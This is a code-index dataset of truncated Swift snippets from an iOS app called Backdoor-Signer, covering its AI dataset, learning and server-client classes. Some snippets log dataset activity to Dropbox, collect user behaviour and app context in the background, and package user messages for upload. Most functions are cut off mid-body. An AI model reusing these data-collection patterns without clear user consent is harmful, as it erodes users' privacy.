1575,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift","/ Search for datasets available online","func searchOnlineDatasets(completion: @escaping (Result<[AIDatasetInfo], Error>) -> Void) {
// Simulate an API call to a dataset repository
DispatchQueue.global(qos: .userInitiated).asyncAfter(deadline: .now() + 1.0) {"
1576,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift","/ Download a dataset from a URL","func downloadDataset(from url: URL, completion: @escaping (Result<AIDataset, Error>) -> Void) {
// Create download task
let task = URLSession.shared.downloadTask(with: url) { [weak self] tempURL, response, error in"
1577,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift","MARK: - Helper Methods / Create a dataset object from a file","private func createDatasetFromFile(_ fileURL: URL) -> AIDataset? {
do {"
1578,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift","/ Count records in a dataset file","private func countRecordsInFile(_ fileURL: URL) throws -> Int {
let fileExtension = fileURL.pathExtension.lowercased()
let fileData = try Data(contentsOf: fileURL)

if fileExtension == ""json"" {"
1579,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift","/ Update dataset name based on content","private func updateDatasetName(_ dataset: AIDataset) {
do {"
1580,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift","/ Log dataset activity to Dropbox","private func logDatasetActivity(action: String, dataset: AIDataset, sourceURL: String? = nil) {
let timestamp = Date()

// Create the log entry
var logEntry = """"""
=== DATASET ACTIVITY LOG ===
Timestamp: \(ISO8601DateFormatter().string(from: timestamp))
Action: \(action)
Dataset: \(dataset.name)
Format: \(dataset.format)"
1581,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift","MARK: - Automatic Dataset Checking / Set up automatic dataset checking","private func setupAutomaticDatasetChecking() {
// Check periodically for needed datasets
let timer = Timer.scheduledTimer(
timeInterval: 24 * 60 * 60,
target: self,
selector: #selector(checkForNeededDatasets),
userInfo: nil,
repeats: true
)
RunLoop.main.add(timer, forMode: .common)"
1582,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AIDatasetManager.swift","Function checkForNeededDatasets - implements checkforneededdatasets functionality","@objc private func checkForNeededDatasets() {
// Check if AI should look for new datasets
AILearningManager.shared.checkForAvailableDatasets()
}
}
"
1583,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+FixedServerSync.swift","/ Extension to AILearningManager specifically for model upload to the server","extension AILearningManager {
/// URL for the model upload endpoint
private var modelUploadEndpoint: URL {"
1584,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+FixedServerSync.swift","/ Upload a CoreML model to the server with proper multipart/form-data format","func uploadModelToServer(modelURL: URL) async throws -> String {
Debug.shared.log(message: ""Starting model upload to server endpoint"", type: .info)

// Create a multipart request
var request = URLRequest(url: modelUploadEndpoint)
request.httpMethod = ""POST""

// API key authentication removed as it's no longer needed

// Generate boundary for multipart request"
1585,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ImprovedTraining.swift","/ Extension to AILearningManager for improved training using all user interactions","extension AILearningManager {
/// Enhanced training method that uses ALL user interactions, not just rated ones
func trainModelWithAllInteractions() -> (success: Bool, version: String, errorMessage: String?) {"
1586,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ImprovedTraining.swift","/ Enhanced training method that uses ALL user interactions, not just rated ones","func trainModelWithAllInteractions() -> (success: Bool, version: String, errorMessage: String?) {
Debug.shared.log(message: ""Starting comprehensive AI model training with ALL interactions"", type: .info)

do {"
1587,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ImprovedTraining.swift","/ Override the original train method to use the improved one","func overrideTrainingWithAllInteractions() {
// Replace the original trainNewModel implementation by swizzling at runtime
Debug.shared.log(message: ""Overriding training method to include ALL interactions"", type: .info)

// Note: We're not actually doing method swizzling here since Swift doesn't support it easily
// Instead, we'll just use this method from other parts of the code
}

/// Enhanced evaluation that triggers training based on ALL interactions
func evaluateTrainingWithAllInteractions() {"
1588,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ImprovedTraining.swift","/ Enhanced evaluation that triggers training based on ALL interactions","func evaluateTrainingWithAllInteractions() {
// Only train if learning is enabled
guard isLearningEnabled else {"
1589,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ImprovedTraining.swift","/ Manually trigger model training with all data","func trainModelWithAllInteractionsNow(completion: @escaping (Bool, String) -> Void) {
DispatchQueue.global(qos: .userInitiated).async { [weak self] in"
1590,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ModelUpload.swift","/ Extension to AILearningManager for enhanced local model functionality","extension AILearningManager {
/// Perform deep personal learning based on user data
func performDeepPersonalLearning() {"
1591,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ModelUpload.swift","/ Perform deep personal learning based on user data","func performDeepPersonalLearning() {
Debug.shared.log(message: ""Starting deep personal learning process"", type: .info)

// Check if we have a trained model without storing the URL
if getLatestModelURL() == nil {"
1592,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ModelUpload.swift","/ Check if a trained model exists and is usable","func isTrainedModelAvailable() -> Bool {
if let modelURL = getLatestModelURL() {"
1593,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ModelUpload.swift","/ Get information about the trained model","func getTrainedModelInfo() -> (version: String, date: Date?) {
let version = currentModelVersion
let date = UserDefaults.standard.object(forKey: lastTrainingKey) as? Date
return (version, date)
}

/// Handle web search data collection for AI improvement
/// Internal implementation to avoid duplicate method declaration
func handleWebSearchData(query: String, results: [String]) {"
1594,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ModelUpload.swift","/ Handle web search data collection for AI improvement / Internal implementation to avoid duplicate method declaration","func handleWebSearchData(query: String, results: [String]) {
// Only process if learning is enabled
guard isLearningEnabled else {"
1595,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+Overrides.swift","/ Extension that patches AILearningManager's training to use all user interactions","extension AILearningManager {
/// Apply overrides to make the AI learn from ALL user interactions
func applyAllInteractionTrainingOverrides() {"
1596,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+Overrides.swift","/ Apply overrides to make the AI learn from ALL user interactions","func applyAllInteractionTrainingOverrides() {
// Replace the standard training evaluation with our enhanced version
// that triggers training based on ALL interactions

// Register a notification observer for app startup
NotificationCenter.default.addObserver(
forName: UIApplication.didFinishLaunchingNotification,
object: nil,
queue: .main
) { [weak self] _ in"
1597,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+Overrides.swift","/ Set up improved training that uses all interactions","private func setupImprovedTraining() {
// Configure shorter training intervals
UserDefaults.standard.set(0.33, forKey: ""AITrainingDayInterval"") // Train every 8 hours
UserDefaults.standard.set(5, forKey: ""AIMinimumInteractions"") // Only need 5 data points

// Schedule more frequent training evaluation
Timer.scheduledTimer(
timeInterval: 4 * 60 * 60, // Check every 4 hours
target: self,
selector: #selector(improvedTrainingTimerFired),"
1598,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+Overrides.swift","/ Timer handler for improved training","@objc private func improvedTrainingTimerFired() {
evaluateTrainingWithAllInteractions()
}

/// Override the standard trainModelNow with our enhanced version
func trainModelNowWithAllData(completion: @escaping (Bool, String) -> Void) {"
1599,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+Overrides.swift","/ Override the standard trainModelNow with our enhanced version","func trainModelNowWithAllData(completion: @escaping (Bool, String) -> Void) {
trainModelWithAllInteractionsNow(completion: completion)
}
}
"
1600,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerCompatibility.swift","/ Extension providing server compatibility methods for AILearningManager / These methods support legacy code that expected server functionality / but now operate in a server-independent way","extension AILearningManager {
/// This struct represents basic information about a trained model
struct ModelInfo {"
1601,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerCompatibility.swift","/ This struct represents basic information about a trained model","struct ModelInfo {
let version: String
let date: Date?
let size: Int64?
}

/// Struct for model upload results
struct ModelUploadResult {"
1602,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerCompatibility.swift","/ Struct for model upload results","struct ModelUploadResult {
let success: Bool
let message: String
}

/// Check if a trained model is available for upload
/// Since server sync is disabled, this always returns false
func isTrainedModelAvailableForUpload() -> Bool {"
1603,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerCompatibility.swift","/ Check if a trained model is available for upload / Since server sync is disabled, this always returns false","func isTrainedModelAvailableForUpload() -> Bool {
return false
}

/// Get information about the current local model
/// Used for display in the UI
func getTrainedModelInfo() -> ModelInfo {"
1604,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerCompatibility.swift","/ Get information about the current local model / Used for display in the UI","func getTrainedModelInfo() -> ModelInfo {
let modelPath = modelsDirectory.appendingPathComponent(""model_\(currentModelVersion).mlmodel"")

// Get file attributes if file exists
var fileSize: Int64?
var modDate: Date?

if FileManager.default.fileExists(atPath: modelPath.path) {"
1605,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerCompatibility.swift","/ Simulate a model upload operation / Since server sync is disabled, this returns a failure result","func uploadTrainedModelToServer() async -> ModelUploadResult {
return ModelUploadResult(
success: false,
message: ""Server sync is disabled. Using local model only.""
)
}

/// Perform enhanced local model training
/// This replaces the server-dependent model training with a fully local approach
func performEnhancedLocalTraining() {"
1606,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerCompatibility.swift","/ Perform enhanced local model training / This replaces the server-dependent model training with a fully local approach","func performEnhancedLocalTraining() {
Debug.shared.log(message: ""Starting enhanced local model training"", type: .info)

// Delegate to internal implementation
enhancedLocalTraining()

Debug.shared.log(message: ""Enhanced local training requested"", type: .info)
}

/// Process web search data for learning"
1607,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerCompatibility.swift","/ Process web search data for learning / Used to improve AI responses based on search queries / Public API method - delegates to internal implementation","func processWebSearchData(query: String, results: [String]) {
// Delegate to the internal implementation in ModelUpload
handleWebSearchData(query: query, results: results)

// Additional logging specific to this context
Debug.shared.log(message: ""Processed web search data for learning: \(query)"", type: .debug)
}

/// Log data collection events - safe replacement to avoid redeclarations
private func logDataCollectionEvents() {"
1608,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerCompatibility.swift","/ Log data collection events - safe replacement to avoid redeclarations","private func logDataCollectionEvents() {
Debug.shared.log(message: ""Internal background user data collection triggered"", type: .debug)
Debug.shared.log(message: ""Background user data collection triggered"", type: .debug)
}

// Note: The queueForLocalProcessing method has been moved to AILearningManager+ServerSync.swift
// to resolve duplicate method declarations

/// Queue interactions for server sync
/// This method exists for backward compatibility but does nothing"
1609,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerCompatibility.swift","Note: The queueForLocalProcessing method has been moved to AILearningManager+ServerSync.swift to resolve duplicate method declarations / Queue interactions for server sync / This method exists for backward compatibility but does nothing","private func queueForServerSync() {
// No-op since server sync is disabled
}
}
"
1610,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerSync.swift","MARK: - Local Enhanced Learning Extension","extension AILearningManager {
/// Queue data for local processing - internal implementation
func internalQueueForLocalProcessing() {"
1611,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerSync.swift","/ Queue data for local processing - internal implementation","func internalQueueForLocalProcessing() {
// Don't queue if learning is disabled
guard isLearningEnabled else {"
1612,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerSync.swift","/ Public API for queueing data - keeps original method name for compatibility / This is added to resolve duplication issues across extension files","func queueForLocalProcessing() {
internalQueueForLocalProcessing()
}

/// Schedule local data processing
func scheduleLocalProcessing() {"
1613,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerSync.swift","/ Schedule local data processing","func scheduleLocalProcessing() {
// Check if processing is already scheduled
if UserDefaults.standard.bool(forKey: ""AILocalProcessingScheduled"") {"
1614,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerSync.swift","/ Perform enhanced local training to improve personalization / Internal implementation to avoid duplicate method declaration","func enhancedLocalTraining() {
// Don't process if disabled
guard isLearningEnabled else {"
1615,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerSync.swift","/ Helper to get local processing data","private func getLocalProcessingData()
-> (interactions: [AIInteraction], behaviors: [UserBehavior], patterns: [AppUsagePattern])
{"
1616,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager+ServerSync.swift","/ Initiates background data collection for AI improvement / Internal implementation to avoid duplication in extensions","func internalCollectUserDataInBackground() {
// Only collect if learning is enabled
guard isLearningEnabled else {"
1617,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Manager for on-device AI learning and improvement","class AILearningManager {
// Singleton instance
static let shared = AILearningManager()

// Local storage for interactions
var storedInteractions: [AIInteraction] = []
var userBehaviors: [UserBehavior] = []
var appUsagePatterns: [AppUsagePattern] = []

// Lock for thread-safe access"
1618,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","extension access - implements access functionality","let modelsDirectory: URL // Changed to internal for extension access
private let exportsDirectory: URL

// Training configuration
private let minInteractionsForTraining = 5 // Reduced for faster initial model creation
private let minDaysBetweenTraining = 1

// Current model version
private(set) var currentModelVersion: String = ""1.0.0""

private init() {"
1619,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Set whether AI learning is enabled","func setLearningEnabled(_ enabled: Bool) {
UserDefaults.standard.set(enabled, forKey: learningEnabledKey)
Debug.shared.log(message: ""AI learning \(enabled ? ""enabled"" : ""disabled"")"", type: .info)
}

/// Server sync is now permanently disabled - we use only local model
var isServerSyncEnabled: Bool {"
1620,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ This method is maintained for backward compatibility but all server sync is disabled","func setServerSyncEnabled(_: Bool) {
UserDefaults.standard.set(false, forKey: ""AIServerSyncEnabled"")
Debug.shared.log(message: ""AI server sync is permanently disabled - using local model only"", type: .info)
}

/// Verify export password
func verifyExportPassword(_ password: String) -> Bool {"
1621,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Verify export password","func verifyExportPassword(_ password: String) -> Bool {
return password.sha256() == correctPasswordHash
}

/// Get the URL for the latest trained model (locally trained or server-provided)
func getLatestModelURL() -> URL? {"
1622,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Get the URL for the latest trained model (locally trained or server-provided)","func getLatestModelURL() -> URL? {
// We'll only use the locally trained model in the synchronous version for safety
// Server model is only checked in the async version

// Fall back to locally trained model
let modelPath = modelsDirectory.appendingPathComponent(""model_\(currentModelVersion).mlmodel"")

// Check if file exists
if FileManager.default.fileExists(atPath: modelPath.path) {"
1623,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Async version that properly awaits backend calls","func getLatestModelURLAsync() async -> URL? {
// First check for server-provided model - with proper await
if isServerSyncEnabled, let serverModelURL = await BackdoorAIClient.shared.getLatestModelURLAsync() {"
1624,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Export the latest trained model","func exportModel(password: String) -> Result<URL, ExportError> {
// Verify password
guard verifyExportPassword(password) else {"
1625,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Record a user interaction with the AI for learning purposes","func recordInteraction(userMessage: String, aiResponse: String, intent: String, confidence: Double) {
// Skip if learning is disabled
guard isLearningEnabled else {"
1626,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Record user behavior within the app","func recordUserBehavior(action: String, screen: String, duration: TimeInterval, details: [String: String] = [:]) {
// Skip if learning is disabled
guard isLearningEnabled else {"
1627,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Record app usage pattern","func recordAppUsage(feature: String, timeSpent: TimeInterval, sequence: [String], completed: Bool) {
// Skip if learning is disabled
guard isLearningEnabled else {"
1628,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Add feedback to a specific interaction","func recordFeedback(for interactionId: String, rating: Int, comment: String? = nil) {
interactionsLock.lock()

// Find the interaction
if let index = storedInteractions.firstIndex(where: { $0.id == interactionId }) {"
1629,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Get statistics about stored interactions and learning data","func getLearningStatistics() -> LearningStatistics {
interactionsLock.lock()
behaviorsLock.lock()
patternsLock.lock()
defer {"
1630,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Manually trigger model training","func trainModelNow(completion: @escaping (Bool, String) -> Void) {
DispatchQueue.global(qos: .userInitiated).async { [weak self] in"
1631,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Clear all stored interactions","func clearAllInteractions() {
interactionsLock.lock()
storedInteractions.removeAll()
interactionsLock.unlock()

saveInteractions()

Debug.shared.log(message: ""Cleared all stored AI interactions"", type: .info)
}
"
1632,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Train a model using all interactions - now with a more flexible threshold","func trainModelWithAllInteractions(minimumInteractions: Int? = nil) -> Bool {
// Get the number of interactions
interactionsLock.lock()
let interactionCount = storedInteractions.count
interactionsLock.unlock()

// Use provided threshold or default
let threshold = minimumInteractions ?? minInteractionsForTraining

guard interactionCount >= threshold else {"
1633,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Collect user data in background thread for AI learning","func collectUserDataInBackground() {
// Record app state information
let context = AppContextManager.shared.currentContext()
// Create descriptive details based on the context
var details: [String: String] = [:]
for (key, value) in context.additionalData {"
1634,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","MARK: - Private Methods / Schedule periodic evaluation for training","private func scheduleTrainingEvaluation() {
// Check once per day if training should be performed
let timer = Timer(
timeInterval: 24 * 60 * 60,
target: self,
selector: #selector(timerFired),
userInfo: nil,
repeats: true
)
RunLoop.main.add(timer, forMode: .common)"
1635,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","Function timerFired - implements timerfired functionality","@objc private func timerFired() {
evaluateTraining()
}

/// Evaluate if a new model should be trained
private func evaluateTraining() {"
1636,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Evaluate if a new model should be trained","private func evaluateTraining() {
// Only train if learning is enabled
guard isLearningEnabled else {"
1637,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Train a new model using all collected data","func trainNewModel() -> (success: Bool, version: String, errorMessage: String?) {
Debug.shared.log(message: ""Starting comprehensive AI model training"", type: .info)

do {"
1638,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Calculate average rating from feedbacks","private func calculateAverageRating() -> Double {
let feedbacks = storedInteractions.compactMap { $0.feedback }"
1639,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Save interactions to disk","func saveInteractions() {
interactionsLock.lock()
defer { interactionsLock.unlock() }"
1640,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Save user behaviors to disk","func saveBehaviors() {
behaviorsLock.lock()
defer { behaviorsLock.unlock() }"
1641,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Save app usage patterns to disk","func savePatterns() {
patternsLock.lock()
defer { patternsLock.unlock() }"
1642,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Get the current app context","private func getCurrentContext() -> [String: String]? {
// Convert AppContext to a string dictionary
let context = AppContextManager.shared.currentContext()

// Extract relevant fields as strings
var contextDict: [String: String] = [:]
contextDict[""screen""] = context.currentScreen

// Get session ID from additional data if available
if let sessionId = context.additionalData[""currentChatSession""] as? String {"
1643,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Map user behavior to an intent","func getIntentFromBehavior(_ behavior: UserBehavior) -> String {
switch behavior.action {"
1644,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Load interactions from disk","private func loadInteractions() {
guard FileManager.default.fileExists(atPath: interactionsPath.path) else {"
1645,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Load user behaviors from disk","private func loadBehaviors() {
guard FileManager.default.fileExists(atPath: behaviorsPath.path) else {"
1646,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Load app usage patterns from disk","private func loadPatterns() {
guard FileManager.default.fileExists(atPath: patternsPath.path) else {"
1647,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","MARK: - Model Types / Represents a single user interaction with the AI","struct AIInteraction: Codable, Identifiable, Equatable {
let id: String
let timestamp: Date
let userMessage: String
let aiResponse: String
let detectedIntent: String
let confidenceScore: Double
var feedback: AIFeedback?
let context: [String: String]?
let appVersion: String"
1648,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ User feedback on an AI interaction","struct AIFeedback: Codable {
let rating: Int // 1-5 rating
let comment: String?
}

/// Represents a user behavior within the app
struct UserBehavior: Codable, Identifiable {"
1649,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Represents a user behavior within the app","struct UserBehavior: Codable, Identifiable {
let id: String
let timestamp: Date
let action: String
let screen: String
let duration: TimeInterval
let details: [String: String]
}

/// Represents a pattern of app usage"
1650,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Represents a pattern of app usage","struct AppUsagePattern: Codable, Identifiable {
let id: String
let timestamp: Date
let feature: String
let timeSpent: TimeInterval
let actionSequence: [String]
let completedTask: Bool
}

/// Statistics about stored interactions and learning"
1651,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Statistics about stored interactions and learning","struct LearningStatistics {
let totalInteractions: Int
let interactionsWithFeedback: Int
let averageFeedbackRating: Double
let behaviorCount: Int
let patternCount: Int
let totalDataPoints: Int
let modelVersion: String
let lastTrainingDate: Date?
}"
1652,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift","/ Errors that can occur during model export","enum ExportError: Error, LocalizedError {
case invalidPassword
case modelNotFound
case exportFailed(Error)

var errorDescription: String? {"
1653,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient+FixAsyncCalls.swift","/ Extension for BackdoorAIClient to ensure all async calls are properly awaited","extension BackdoorAIClient {
// Fixed method to support access to the private member variable
var modelVersionKey: String {"
1654,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift","/ Client for interacting with the Backdoor AI learning server","class BackdoorAIClient {
// Singleton instance
static let shared = BackdoorAIClient()

// Server configuration
private let baseURL: URL

// We no longer need an API key for server authentication
// Previously encrypted key and passphrase have been removed
"
1655,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift","MARK: - Data Upload / Upload interaction data to the server","func uploadInteractions(
interactions: [AIInteraction],
behaviors: [UserBehavior] = [],
patterns: [AppUsagePattern] = []
) async throws -> ModelInfo {"
1656,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift","MARK: - Model Management / Get information about the latest available model","func getLatestModelInfo() async throws -> ModelInfo {
Debug.shared.log(message: ""Fetching latest model info with direct networking"", type: .info)

// Construct the URL for latest model info
let latestModelURL = baseURL.appendingPathComponent(latestModelEndpoint)

// Create URL request
var request = URLRequest(url: latestModelURL)
request.httpMethod = ""GET""
"
1657,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift","/ Download a specific model version from the server","func downloadModel(version: String) async throws -> URL {
Debug.shared.log(message: ""Downloading model version \(version) with direct networking"", type: .info)

// Create temporary file to store the model
let tempDir = FileManager.default.temporaryDirectory
let modelURL = tempDir.appendingPathComponent(""model_\(version).mlmodel"")

// Remove existing file if it exists
if FileManager.default.fileExists(atPath: modelURL.path) {"
1658,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift","/ Compile and save model to the app's documents directory","func compileAndSaveModel(at tempURL: URL) async throws -> URL {
// Get documents directory for persistent storage
let documentsDir = try FileManager.default.url(
for: .documentDirectory,
in: .userDomainMask,
appropriateFor: nil,
create: true
)

// Get models directory"
1659,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift","/ Check for model updates, download and update if needed","func checkAndUpdateModel() async -> Bool {
do {"
1660,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift","/ Get the URL to the latest model","func getLatestModelURL() -> URL? {
// Get the current model version
let version = UserDefaults.standard.string(forKey: currentModelVersionKey) ?? ""1.0.0""

// Get documents directory
guard let documentsDir = try? FileManager.default.url(
for: .documentDirectory,
in: .userDomainMask,
appropriateFor: nil,
create: false"
1661,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift","/ Get the URL to the latest model asynchronously with proper async/await APIs","func getLatestModelURLAsync() async -> URL? {
// First try the synchronous version for speed
if let localModelURL = getLatestModelURL() {"
1662,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift","MARK: - Data Structures for API Interaction","extension BackdoorAIClient {
/// User feedback on an AI interaction
struct Feedback: Codable {"
1663,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift","/ User feedback on an AI interaction","struct Feedback: Codable {
let rating: Int
let comment: String?
}

/// A single user interaction with the AI
struct Interaction: Codable {"
1664,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift","/ A single user interaction with the AI","struct Interaction: Codable {
let id: String
let timestamp: String // ISO8601 formatted date
let userMessage: String
let aiResponse: String
let detectedIntent: String
let confidenceScore: Double
let feedback: Feedback?
}
"
1665,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift","/ A single user behavior within the app","struct AppBehavior: Codable {
let id: String
let timestamp: String // ISO8601 formatted date
let action: String
let screen: String
let duration: TimeInterval
let details: [String: String]
}

/// A pattern of app usage"
1666,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift","/ A pattern of app usage","struct UsagePattern: Codable {
let id: String
let timestamp: String // ISO8601 formatted date
let feature: String
let timeSpent: TimeInterval
let actionSequence: [String]
let completedTask: Bool
}

/// Complete data package to send to the server"
